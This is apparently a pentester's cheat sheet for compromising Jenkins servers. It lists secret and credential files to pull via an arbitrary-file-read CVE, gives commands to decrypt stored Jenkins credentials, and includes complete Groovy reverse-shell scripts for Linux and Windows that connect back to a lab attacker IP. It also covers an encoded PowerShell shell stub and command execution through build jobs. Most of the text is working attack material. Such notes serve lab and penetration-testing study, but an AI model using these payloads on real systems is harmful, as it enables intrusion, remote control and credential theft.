## Arbitrary file read
https://github.com/godylockz/CVE-2024-23897

Some important files
```
$JENKINS_HOME/users/users.xml
	$JENKINS_HOME/users/<user_string>/config.xml
		may reveal hash of user!!!
_____________________________________________________

$JENKINS_HOME/credentials.xml 
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret
```
NOTE: Decrypting the creds found likely requires all three, and a shell of some sort to retrieve the files, OR jenkins /script access
See [[Builder]] as an example

Jenkins credential decryptor
https://github.com/hoto/jenkins-credentials-decryptor
```
git clone https://github.com/hoto/jenkins-credentials-decryptor.git

make build

bin/jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c credentials.xml -o text
```

## Command Execution
#### Reverse Shells via Script Console
Dashboard > Manage Jenkins > Script Console
```bash
# Groovy script for reverse shell (Linux):
# https://dzmitry-savitski.github.io/2018/03/groovy-reverse-and-bind-shell

String host="10.10.14.255";
int port=1337;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Groovy script for reverse shell (Windows):

String host="10.10.14.255"; int port=1337; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


# println
println "cmd.exe /c whoami".execute().txt
println "powershell.exe -e <base64_rev_shell>".execute().txt
```
Then execute and catch the shell with a listener

#### Command Execution via Jobs
If Console is not present but Build is, we can create jobs which will execute

Build Envirnoment > Add build step > Execute Windows batch command
Command
```
cmd /c whoami
```
Save
Build Now
Click the build 
Go to "Console Output"
This reveals the output of the commands we issue

